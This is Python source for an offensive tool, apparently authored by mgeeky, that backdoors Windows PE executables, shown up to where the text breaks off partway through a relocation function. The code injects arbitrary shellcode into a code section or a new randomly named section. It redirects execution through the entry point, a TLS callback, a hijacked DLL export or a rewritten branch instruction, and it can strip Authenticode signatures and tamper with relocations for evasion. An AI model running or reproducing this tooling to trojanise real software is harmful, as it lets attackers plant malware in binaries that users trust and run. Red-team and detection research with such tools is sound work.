#!/usr/bin/python3
#
# Author:
#     Mariusz Banach / mgeeky '22-'23, (@mariuszbit)
#     <mb@binary-offensive.com>
#
# Requirements:
#   - pefile
#   - capstone
#   - keystone
#

import os, re, sys
import string
import shutil
import random
import tempfile
import argparse
import textwrap
import struct
import pefile
import capstone
import keystone
from enum import IntEnum


options = {
    'verbose' : False,
    'mode' : '',
    'section_name' : '',
    'ioc' : '',
    'remove_signature' : False
}

DefaultSectionName = '.' + ''.join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 6)))

class Logger:
    def fatal(txt):
        print('[!] ' + txt)
        sys.exit(1)

    def info(txt):
        print('[.] ' + txt)

    def err(txt):
        print('[-] ' + txt)

    def ok(txt):
        print('[+] ' + txt)

    def dbg(txt):
        if options['verbose']:
            print('[>] ' + txt)

#
# Source:
#   https://github.com/joxeankoret/tahh/blob/master/evasion/SectionDoubleP.py
#

class SectionDoublePError(Exception):
    pass

class SectionDoubleP:
    def __init__(self, pe):
        self.pe = pe
    
    def __adjust_optional_header(self):
        """ Recalculates the SizeOfImage, SizeOfCode, SizeOfInitializedData and
            SizeOfUninitializedData of the optional header.
        """
        
        # SizeOfImage = ((VirtualAddress + VirtualSize) of the new last section)
        self.pe.OPTIONAL_HEADER.SizeOfImage = (self.pe.sections[-1].VirtualAddress + 
                                                self.pe.sections[-1].Misc_VirtualSize)
        
        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0
        
        # Recalculating the sizes by iterating over every section and checking if
        # the appropriate characteristics are set.
        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                # Section contains code.
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
            if section.Characteristics & 0x00000040:
                # Section contains initialized data.
                self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
            if section.Characteristics & 0x00000080:
                # Section contains uninitialized data.
                self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData
    
    def __add_header_space(self):
        """ To make space for a new section header a buffer filled with nulls is added at the
            end of the headers. The buffer has the size of one file alignment.
            The data between the last section header and the end of the headers is copied to 
            the new space (everything moved by the size of one file alignment). If any data
            directory entry points to the moved data the pointer is adjusted.
        """
        
        FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
        SizeOfHeaders = self.pe.OPTIONAL_HEADER.SizeOfHeaders
        
        data = b'\x00' * FileAlignment
        
        # Adding the null buffer.
        self.pe.__data__ = (self.pe.__data__[:SizeOfHeaders] + data + 
                            self.pe.__data__[SizeOfHeaders:])
        
        section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 + 
                        self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)
        
        # Copying the data between the last section header and SizeOfHeaders to the newly allocated
        # space.
        new_section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28
        size = SizeOfHeaders - new_section_offset
        data = self.pe.get_data(new_section_offset, size)
        self.pe.set_bytes_at_offset(new_section_offset + FileAlignment, data)
        
        # Filling the space, from which the data was copied from, with NULLs.
        self.pe.set_bytes_at_offset(new_section_offset, b'\x00' * FileAlignment)
        
        data_directory_offset = section_table_offset - self.pe.OPTIONAL_HEADER.NumberOfRvaAndSizes * 0x8
        
        # Checking data directories if anything points to the space between the last section header
        # and the former SizeOfHeaders. If that's the case the pointer is increased by FileAlignment.
        for data_offset in range(data_directory_offset, section_table_offset, 0x8):
            data_rva = self.pe.get_dword_from_offset(data_offset)
            
            if new_section_offset <= data_rva and data_rva < SizeOfHeaders:
                self.pe.set_dword_at_offset(data_offset, data_rva + FileAlignment)
        
        SizeOfHeaders_offset = (self.pe.DOS_HEADER.e_lfanew + 4 + 
                        self.pe.FILE_HEADER.sizeof() + 0x3C)
        
        # Adjusting the SizeOfHeaders value.
        self.pe.set_dword_at_offset(SizeOfHeaders_offset, SizeOfHeaders + FileAlignment)
        
        section_raw_address_offset = section_table_offset + 0x14
        
        # The raw addresses of the sections are adjusted.
        for section in self.pe.sections:
            if section.PointerToRawData != 0:
                self.pe.set_dword_at_offset(section_raw_address_offset, section.PointerToRawData+FileAlignment)
            
            section_raw_address_offset += 0x28
        
        # All changes in this method were made to the raw data (__data__). To make these changes
        # accessbile in self.pe __data__ has to be parsed again. Since a new pefile is parsed during
        # the init method, the easiest way is to replace self.pe with a new pefile based on __data__
        # of the old self.pe.
        self.pe = pefile.PE(data=self.pe.__data__)
    
    def __is_null_data(self, data):
        """ Checks if the given data contains just null bytes.
        """
        
        for char in data:
            if char != b'\x00':
                return False
        return True
    
    def pop_back(self):
        """ Removes the last section of the section table.
            Deletes the section header in the section table, the data of the section in the file,
            pops the last section in the sections list of pefile and adjusts the sizes in the
            optional header.
        """
        
        # Checking if there are any sections to pop.
        if (    self.pe.FILE_HEADER.NumberOfSections > 0
            and self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections)):
            
            # Stripping the data of the section from the file.
            if self.pe.sections[-1].SizeOfRawData != 0:
                self.pe.__data__ = (self.pe.__data__[:self.pe.sections[-1].PointerToRawData] + \
                                    self.pe.__data__[self.pe.sections[-1].PointerToRawData + \
                                                        self.pe.sections[-1].SizeOfRawData:])
            
            # Overwriting the section header in the binary with nulls.
            # Getting the address of the section table and manually overwriting
            # the header with nulls unfortunally didn't work out.
            self.pe.sections[-1].Name = b'\x00'*8
            self.pe.sections[-1].Misc_VirtualSize = 0x00000000
            self.pe.sections[-1].VirtualAddress = 0x00000000
            self.pe.sections[-1].SizeOfRawData = 0x00000000
            self.pe.sections[-1].PointerToRawData = 0x00000000
            self.pe.sections[-1].PointerToRelocations = 0x00000000
            self.pe.sections[-1].PointerToLinenumbers = 0x00000000
            self.pe.sections[-1].NumberOfRelocations = 0x0000
            self.pe.sections[-1].NumberOfLinenumbers = 0x0000
            self.pe.sections[-1].Characteristics = 0x00000000
            
            self.pe.sections.pop()
            self.pe.FILE_HEADER.NumberOfSections -=1

            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 + 
                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)
            self.pe.parse_sections(section_table_offset)

            assert len(self.pe.sections) == self.pe.FILE_HEADER.NumberOfSections
            
            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("There's no section to pop.")
    
    def push_back(self, Name=b".NewSec", VirtualSize=0x00000000, VirtualAddress=0x00000000, 
                RawSize=0x00000000, RawAddress=0x00000000, RelocAddress=0x00000000, 
                Linenumbers=0x00000000, RelocationsNumber=0x0000, LinenumbersNumber=0x0000,
                Characteristics=0xE00000E0, Data=b""):
        """ Adds the section, specified by the functions parameters, at the end of the section
            table.
            If the space to add an additional section header is insufficient, a buffer is inserted
            after SizeOfHeaders. Data between the last section header and the end of SizeOfHeaders
            is copied to +1 FileAlignment. Data directory entries pointing to this data are fixed.
            
            A call with no parameters creates the same section header as LordPE does. But for the
            binary to be executable without errors a VirtualSize > 0 has to be set.
            
            If a RawSize > 0 is set or Data is given the data gets aligned to the FileAlignment and
            is attached at the end of the file.
        """
        
        if self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections):
            
            FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
            SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment
            
            if len(Name) > 8:
                raise SectionDoublePError("The name is too long for a section.")
            
            if (    VirtualAddress < (self.pe.sections[-1].Misc_VirtualSize + 
                                        self.pe.sections[-1].VirtualAddress)
                or  VirtualAddress % SectionAlignment != 0):
                
                if (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) != 0:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize - 
                        (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)
                else:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize)
            
            if VirtualSize < len(Data):
                VirtualSize = len(Data)
            
            if (len(Data) % FileAlignment) != 0:
                # Padding the data of the section.
                Data += b'\x00' * (FileAlignment - (len(Data) % FileAlignment))
            
            if RawSize != len(Data):
                if (    RawSize > len(Data)
                    and (RawSize % FileAlignment) == 0):
                    Data += b'\x00' * (RawSize - (len(Data) % RawSize))
                else:
                    RawSize = len(Data)
            
            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 + 
                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)
            
            # If the new section header exceeds the SizeOfHeaders there won't be enough space
            # for an additional section header. Besides that it's checked if the 0x28 bytes
            # (size of one section header) after the last current section header are filled
            # with nulls/ are free to use.
            if (        self.pe.OPTIONAL_HEADER.SizeOfHeaders < 
                        section_table_offset + (self.pe.FILE_HEADER.NumberOfSections+1)*0x28
                or not self.__is_null_data(self.pe.get_data(section_table_offset + 
                        (self.pe.FILE_HEADER.NumberOfSections)*0x28, 0x28))):
                
                Logger.dbg(f'Checking if more space can be added to PE headers: {self.pe.OPTIONAL_HEADER.SizeOfHeaders} < {self.pe.sections[0].VirtualAddress}?')

                if self.pe.OPTIONAL_HEADER.SizeOfHeaders < self.pe.sections[0].VirtualAddress:
                    
                    self.__add_header_space()
                    Logger.dbg("Additional space to add a new section header was allocated.")
                else:
                    raise SectionDoublePError("No more space can be added for the section header.")
            
            
            # The validity check of RawAddress is done after space for a new section header may
            # have been added because if space had been added the PointerToRawData of the previous
            # section would have changed.
            if (RawAddress != (self.pe.sections[-1].PointerToRawData + 
                                    self.pe.sections[-1].SizeOfRawData)):
                    RawAddress =     \
                        (self.pe.sections[-1].PointerToRawData + self.pe.sections[-1].SizeOfRawData)
            
            
            # Appending the data of the new section to the file.
            if len(Data) > 0:
                self.pe.__data__ = (self.pe.__data__[:RawAddress] + Data + \
                                    self.pe.__data__[RawAddress:])
            
            section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28
            
            # Manually writing the data of the section header to the file.
            self.pe.set_bytes_at_offset(section_offset, Name)
            self.pe.set_dword_at_offset(section_offset+0x08, VirtualSize)
            self.pe.set_dword_at_offset(section_offset+0x0C, VirtualAddress)
            self.pe.set_dword_at_offset(section_offset+0x10, RawSize)
            self.pe.set_dword_at_offset(section_offset+0x14, RawAddress)
            self.pe.set_dword_at_offset(section_offset+0x18, RelocAddress)
            self.pe.set_dword_at_offset(section_offset+0x1C, Linenumbers)
            self.pe.set_word_at_offset(section_offset+0x20, RelocationsNumber)
            self.pe.set_word_at_offset(section_offset+0x22, LinenumbersNumber)
            self.pe.set_dword_at_offset(section_offset+0x24, Characteristics)
            
            self.pe.FILE_HEADER.NumberOfSections +=1
            
            # Parsing the section table of the file again to add the new section to the sections
            # list of pefile.
            self.pe.parse_sections(section_table_offset)
            
            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("The NumberOfSections specified in the file header and the " +
                "size of the sections list of pefile don't match ({} != {})".format(
                self.pe.FILE_HEADER.NumberOfSections, len(self.pe.sections)
                ))
        
        return self.pe

def hexdump(data, addr = 0, num = 0):
    s = ''
    n = 0
    lines = []
    if num == 0: num = len(data)

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (addr + i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % (data[j] & 0xff)

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)
    return '\n'.join(lines)

class PeBackdoor:
    IMAGE_DIRECTORY_ENTRY_SECURITY = 4
    IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
    IMAGE_DIRECTORY_ENTRY_TLS = 9

    IMAGE_REL_BASED_ABSOLUTE              = 0
    IMAGE_REL_BASED_HIGH                  = 1
    IMAGE_REL_BASED_LOW                   = 2
    IMAGE_REL_BASED_HIGHLOW               = 3
    IMAGE_REL_BASED_HIGHADJ               = 4
    IMAGE_REL_BASED_DIR64                 = 10

    class SupportedSaveModes(IntEnum):
        WithinCodeSection   = 1
        NewPESection        = 2

    class SupportedRunModes(IntEnum):
        ModifyOEP           = 1
        BackdoorEP          = 2
        TLSCallback         = 3
        HijackExport        = 4

    availableSaveModes = {
        SupportedSaveModes.WithinCodeSection:   'store shellcode in the middle of code section',
        SupportedSaveModes.NewPESection:        'append shellcode to the PE file in a new PE section',
    }

    availableRunModes = {
        SupportedRunModes.ModifyOEP:    'change AddressOfEntryPoint',
        SupportedRunModes.TLSCallback:  'setup TLS callback',
        SupportedRunModes.BackdoorEP:   'modify first branching instruction from Original Entry Point',
    }

    def __init__(self, options, logger):
        self.options = options
        self.pe = None
        self.logger = logger
        self.createdTlsSection = False

    def openFile(self):
        self.pe = pefile.PE(self.infile, fast_load=False)
        self.pe.parse_data_directories()

        self.ptrSize = 4
        self.arch = self.getFileArch()
        if self.arch == 'x64': 
            self.ptrSize = 8

    def getFileArch(self):
        if self.pe.FILE_HEADER.Machine == 0x014c:
            return "x86"

        if self.pe.FILE_HEADER.Machine == 0x8664:
            return "x64"

        raise Exception("Unsupported PE file architecture.")

    def backdoor(self, saveMode, runMode, shellcode, infile, outfile):
        self.saveMode = saveMode
        self.runMode = runMode
        self.shellcode = shellcode
        self.infile = infile
        self.outfile = outfile
        self.sectionName = options.get('section_name', DefaultSectionName)
        self.shellcodeOffset = 0

        try:
            PeBackdoor.SupportedSaveModes(saveMode)
        except:
            self.logger.fatal(f'Unsupported save mode specified. Please see help message for a list of available save,run modes.')

        try:
            PeBackdoor.SupportedRunModes(runMode)
        except:
            self.logger.fatal(f'Unsupported run mode specified. Please see help message for a list of available save,run modes.')

        try:
            with open(self.shellcode, 'rb') as f:
                self.shellcodeData = f.read()

            if len(self.options['ioc']) > 0:
                self.shellcodeData += b'\x00\x00\x00\x00' + self.options['ioc'].encode() + b'\x00\x00\x00\x00'

            self.openFile()

            if not self.injectShellcode():
                self.logger.err('Could not inject shellcode into PE file!')
                return False

            if not self.setupShellcodeEntryPoint():
                self.logger.err('Could not setup shellcode launch within PE file!')
                return False

            remainingRelocsSize = self.getRemainingRelocsDirectorySize()
            numOfRelocs = int((remainingRelocsSize - 8) / 2)
            self.logger.dbg(f'Still can add up to {numOfRelocs} relocs tampering with shellcode for evasion purposes.')

            if self.options['remove_signature']:
                self.removeSignature()

            self.logger.dbg('Saving modified PE file...')
            self.pe.write(self.outfile)

            return True

        except pefile.PEFormatError:
            self.logger.warn('Input file is not a valid PE file.')
            return False

        except Exception as e:
            raise

        finally:
            self.pe.close()

    def removeSignature(self):
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
        size = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size

        self.pe.set_bytes_at_rva(addr, b'\x00' * size)

        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0

        self.logger.ok('PE executable Authenticode signature removed.')
        return True

    def injectShellcode(self):
        if self.saveMode == int(PeBackdoor.SupportedSaveModes.NewPESection):
            self.pe.write(self.outfile)
            self.pe.close()

            out = self.addNewPESection(self.outfile, self.sectionName, self.shellcodeData)

            with open(self.outfile, 'rb') as f:
                self.pe = pefile.PE(data = f.read(), fast_load = False)

            offset = self.pe.sections[-1].PointerToRawData
            self.shellcodeOffset = offset

            rva = self.pe.get_rva_from_offset(offset)

            self.logger.ok(f'Shellcode injected into a new PE section {self.sectionName} at RVA 0x{rva:x}')
            return True

        elif self.saveMode == int(PeBackdoor.SupportedSaveModes.WithinCodeSection):
            for sect in self.pe.sections:
                name = sect.Name.decode()
                self.logger.dbg(f'Checking if section is executable: {name}')

                if sect.Characteristics & 0x20 != 0:    
                    self.logger.dbg(f'Backdooring {name} section.')

                    if sect.Misc_VirtualSize < len(self.shellcodeData):
                        self.logger.fatal(f'''Input shellcode is too large to fit into target PE executable code section!
    Shellcode size    : {len(self.shellcodeData)}
    Code section size : {sect.Misc_VirtualSize}
''')

                    offset = int((sect.Misc_VirtualSize - len(self.shellcodeData)) / 2)
                    self.logger.dbg(f'Inserting shellcode into 0x{offset:x} offset.')

                    self.pe.set_bytes_at_offset(offset, self.shellcodeData)
                    self.shellcodeOffset = offset
            
                    rva = self.pe.get_rva_from_offset(offset)

                    p = sect.PointerToRawData + sect.SizeOfRawData - 64
                    graph = textwrap.indent(f'''
Beginning of {name}:
{textwrap.indent(hexdump(self.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}
    
Injected shellcode in the middle of {name}:
{hexdump(self.shellcodeData, offset, 64)}
    
Trailing {name} bytes:
{hexdump(self.pe.get_data(self.pe.get_rva_from_offset(p)), p, 64)}
''', '\t')

                    self.logger.ok(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
                    self.logger.dbg(graph)
                    return True

        return False

    def setupShellcodeEntryPoint(self):
        if self.runMode == int(PeBackdoor.SupportedRunModes.ModifyOEP):
            rva = self.pe.get_rva_from_offset(self.shellcodeOffset)
            self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = rva

            self.logger.ok(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
            return True

        elif self.runMode == int(PeBackdoor.SupportedRunModes.TLSCallback):
            self.logger.err(f'''
======================================================================================================
   WARNING! TLS Callback technique IS UNSTABLE
======================================================================================================

However TLS Callback shellcode execution might seem fancy, in practice it's not very useful from offensive perspective.
Beware: Even the simplest WinExec("notepad.exe") shellcode might not work!

The reason is that Windows Image Loader first calls out to TLS Callbacks before initializing loaded DLLs (calling DllMain)
which induces typical Loader Lock problems similar to running complex operations from inside of a DllMain.

This means, that however we'll setup TLS callback (and related structures) correctly, complex shellcode depending on
loaded DLLs probably won't work - resulting in mysterious crashes, deadlocks, freezes etc.

Quote [1]:
    "One interesting fact about TLS initializers is that they are always called before DLL initializers for their 
    corresponding DLL. (The process occurs in sequence, such that DLL A’s TLS and DLL initializers are called, then 
    DLL B’s TLS and DLL initializers, and so forth.) This means that TLS initializers need to be careful about making, 
    say, CRT calls (as the C runtime is initialized before the user’s DllMain routine is called, by the actual DLL 
    initializer entrypoint, such that the CRT will not be initialized when a TLS initializer for the module is invoked). 
    This can be dangerous, as global objects will not have been constructed yet; the module will be in a completely uninitialized state"

Sources:
  [1] http://www.nynaeve.net/?p=186
  [2] http://www.nynaeve.net/?p=187

======================================================================================================
''')
            return self.injectTls()

        elif self.runMode == int(PeBackdoor.SupportedRunModes.BackdoorEP):
            return self.backdoorEntryPoint()

        elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
            addr = self.getExportEntryPoint()
            if addr == -1:
                self.logger.fatal('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')

            return self.backdoorEntryPoint(addr)

        return False
    
    def getExportEntryPoint(self):
        dec = lambda x: '???' if x is None else x.decode() 

        exportName = self.options.get('export', '')
        if len(exportName) == 0:
            self.logger.fatal('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')

        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        self.pe.parse_data_directories(directories=d)

        if self.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
            self.logger.err('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
            return -1
        
        exports = [(e.ordinal, dec(e.name)) for e in self.pe.DIRECTORY_ENTRY_EXPORT.symbols]

        for export in exports:
            self.logger.dbg(f'DLL Export: {export[0]} {export[1]}')
            if export[1].lower() == exportName.lower():

                addr = self.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
                self.logger.ok(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
                return addr

        return -1

    def backdoorEntryPoint(self, addr = -1):
        imageBase = self.pe.OPTIONAL_HEADER.ImageBase
        self.shellcodeAddr = self.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        cs = None
        ks = None

        if self.arch == 'x86':
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32 + keystone.KS_MODE_LITTLE_ENDIAN)
        else:    
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64 + keystone.KS_MODE_LITTLE_ENDIAN)

        cs.detail = True

        ep = addr

        if addr == -1:
            ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint

        ep_ava = ep + self.pe.OPTIONAL_HEADER.ImageBase

        data = self.pe.get_memory_mapped_image()[ep:ep+128]
        offset = 0

        self.logger.dbg('Entry Point disasm:')

        disasmData = self.pe.get_memory_mapped_image()
        output = self.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)

        if output != 0:
            self.logger.dbg('Now disasm looks like follows: ')

            disasmData = self.pe.get_memory_mapped_image()
            self.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)

            self.logger.dbg('\n[>] Inserted backdoor code: ')
            for instr in cs.disasm(bytes(self.compiledTrampoline), output):
                self._printInstr(instr, 1)

            self.logger.dbg('')
            self.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)

        else:
            self.logger.err('Did not find suitable candidate for Entry Point branch hijack!')

        return output

    def getBackdoorTrampoline(self, cs, ks, instr):
        trampoline = ''
        addrOffset = -1

        registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']

        if self.arch == 'x86':
            registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi'] 

        reg = random.choice(registers).upper()
        reg2 = random.choice(registers).upper()

        while reg2 == reg:
            reg2 = random.choice(registers).upper()

        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:x}')
        for instr2 in cs.disasm(bytes(enc), 0):
            addrOffset = len(instr2.bytes) - instr2.addr_size
            break

        found = instr.mnemonic.lower() in ['jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
        found |= instr.mnemonic.lower() == 'call'

        if found:
            self.logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')

            jump = random.choice([
                f'CALL {reg}',

                #
                # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
                # are known to crash on seldom occassions.
                #

                #f'JMP {reg}',
                #f'PUSH {reg} ; RET',
            ])

            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:x} ; {jump}'

        for ins in trampoline.split(';'):
            self.logger.info(f'\t{ins.strip()}')

        self.logger.info('')

        return (trampoline, addrOffset)

    def backdoorInstruction(self, cs, ks, disasmData, startOffset, instr, operand, depth):
        encoding = b''
        count = 0

        if depth < 2: 
            return 0

        (trampoline, addrOffset) = self.getBackdoorTrampoline(cs, ks, instr)

        if len(trampoline) > 0:
            encoding, count = ks.asm(trampoline)
            self.pe.set_bytes_at_rva(instr.address, bytes(encoding))

            relocs = (
                instr.address + addrOffset,
            )

            pageRva = 4096 * int((instr.address + addrOffset) / 4096)
            self.addImageBaseRelocations(pageRva, relocs)

            self.trampoline = trampoline
            self.compiledTrampoline = encoding
            self.compiledTrampolineCount = count

            self.logger.ok('Successfully backdoored entry point with jump/call to shellcode.\n')
            return instr.address

        return 0

    def disasmBytes(self, cs, ks, disasmData, startOffset, length, callback = None, maxDepth = 5):
        return self._disasmBytes(cs, ks, disasmData, startOffset, length, callback, maxDepth, 1)

    def _printInstr(self, instr, depth):
        _bytes = [f'{x:02x}' for x in instr.bytes[:8]]
        if len(instr.bytes) < 8:
            _bytes.extend(['  ',] * (8 - len(instr.bytes)))

        instrBytes = ' '.join([f'{x}' for x in _bytes])
        self.logger.dbg('\t' * 1 + f'[{instr.address:08x}]\t{instrBytes}' + '\t' * depth + f'{instr.mnemonic}\t{instr.op_str}')


    def _disasmBytes(self, cs, ks, disasmData, startOffset, length, callback, maxDepth, depth):
        if depth > maxDepth:
            return 0

        data = disasmData[startOffset:startOffset + length]

        for instr in cs.disasm(data, startOffset):
            self._printInstr(instr, depth)

            if len(instr.operands) == 1:
                operand = instr.operands[0]

                if operand.type == capstone.CS_OP_IMM:
                    self.logger.dbg('\t' * (depth+1) + f' -> OP_IMM: 0x{operand.value.imm:x}')
                    self.logger.dbg('')

                    if callback:
                        out = callback(cs, ks, disasmData, startOffset, instr, operand, depth)
                        if out != 0:
                            return out

                    if depth + 1 <= maxDepth:
                        out = self._disasmBytes(cs, ks, disasmData, operand.value.imm, length, callback, maxDepth, depth + 1)
                        return out

        if not callback:
            return 1

        return 0

    def addImageBaseRelocations(self, pageRva, relocs):
        relocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64': 
            relocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        if not self.pe.has_relocs():
            self.createBaseReloc(pageRva, relocs)

        else:
            self.addRelocs(pageRva, relocs)

    def getSectionIndexByName(self, name):
        i = 0
        for sect in self.pe.sections:
            if sect.Name.decode().lower().startswith(name.lower()):
                return i
            i += 1

        self.logger.err(f'Could not find section with name {name}!')
        return -1

    def getSectionIndexByDataDir(self, dirIndex):
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[dirIndex].VirtualAddress

        i = 0
        for sect in self.pe.sections:
            if addr >= sect.VirtualAddress and addr < (sect.VirtualAddress + sect.Misc_VirtualSize):
                return i
            i += 1

        self.logger.err(f'Could not find section with directory index {dirIndex}!')
        return -1

    def getRemainingRelocsDirectorySize(self):
        if self.createdTlsSection:
            return 0x1000

        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)

        out = self.pe.sections[relocsIndex].SizeOfRawData - self.pe.sections[relocsIndex].Misc_VirtualSize
        return out

    def createBaseReloc(self, pageRva, relocs):
        assert pageRva > 0

        imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64':
            imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        self.logger.info('Input PE file does not have relocations table. Creating one...')

        sizeOfReloc = 2 * len(relocs) + 2 * 4

        self.pe.write(self.outfile)
        self.pe.close()

        out = self.addNewPESection(self.outfile, '.reloc', b'\0' * sizeOfReloc, characteristics = 0x42000040)

        with open(self.outfile, 'rb') as f:
            self.pe = pefile.PE(data = f.read(), fast_load = False)
            self.pe.parse_data_directories()

        relocDirRva = self.pe.sections[-1].VirtualAddress
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = relocDirRva
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = sizeOfReloc

        self.pe.parse_data_directories(directories = [PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC, ])

        # VirtualAddress
        self.pe.set_dword_at_rva(relocDirRva, pageRva)

        # SizeOfBlock
        self.pe.set_dword_at_rva(relocDirRva + 4, sizeOfReloc)

        self.logger.dbg(f'Adding {len(relocs)} relocations for Page RVA 0x{pageRva:x} - size of block: 0x{sizeOfReloc:x}')

        i = 0
        for reloc in relocs:
            reloc_offset = (reloc - pageRva)
            reloc_type = imageBaseRelocType << 12

            relocWord = (reloc_type | reloc_offset)
            self.pe.set_word_at_rva(relocDirRva + relocsSize + 8 + i * 2, relocWord)
            self.logger.dbg(f'\tReloc{i} for addr 0x{reloc:x}: 0x{relocWord:x} - 0x{reloc_offset:x} - type: {imageBaseRelocType}')
            i += 1

        self.createdTlsSection = True

    def addRelocs(self, pageRva, relocs):
        assert pageRva > 0

        imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64':
            imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        self.logger.info('Adding new relocations to backdoored PE file...')

        relocsSize = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size
        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        sizeOfReloc = 2 * len(relocs) + 2 * 4

        if sizeOfReloc >= self.getRemainingRelocsDirectorySize():
            self.logger.warn('WARNING! Cannot add any more relocations to this file. Probably TLS Callback execution technique wont work.')
            self.logger.warn('         Will try disabling relocations on output file. Expect corrupted executable though!')

            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0
            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0
            return

        relocDirRva = self.pe.sections[relocsIndex].VirtualAddress
